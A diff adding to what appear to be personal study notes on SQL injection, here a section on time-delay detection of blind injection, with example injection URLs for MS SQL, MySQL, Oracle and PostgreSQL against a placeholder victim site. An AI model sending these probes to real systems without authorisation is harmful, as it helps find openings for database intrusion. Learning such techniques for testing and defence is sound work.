@@ -110,8 +110,17 @@ https://www.victim.com/displayUser.aspx?User=Bob -> Default
 
 ### 4. Time Delays
 
+- It use best with blind sql injection. 
+- The rule is: If we set the delay and the response from the server is delayed -> Existence of SQL Injection
+
+- MS SQL: https://www.victim.com/welcome.aspx?User=45; waitfor delay '0:0:5';--
+- MySQL: https://www.victim.com/welcome.aspx?User=45; SELECT BENCHMARK(1000000, ENCODE('hello', 'mom'));--
+- Oracle: https://www.victim.com/welcome.aspx?User=45 or 1=dbms_pipe.recieve_message('RDS', 10)
+- PostgreSQL: https://www.victim.com/welcome.aspx?User=45; SELECT pg_sleep(10);--
+
 ## III. Automating
 
+-
 
 ## IV. Techniques:
 - ' -> injectable?
